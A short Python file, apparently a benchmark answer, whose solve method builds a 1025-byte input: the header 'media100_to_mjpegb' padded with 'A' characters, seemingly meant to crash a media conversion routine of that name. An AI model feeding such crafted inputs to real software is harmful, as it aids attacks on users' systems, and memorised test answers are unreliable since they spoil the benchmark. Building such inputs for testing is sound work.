import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b"media100_to_mjpegb\n"
        total_len = 1025
        if len(header) >= total_len:
            return header[:total_len]
        return header + b"A" * (total_len - len(header))
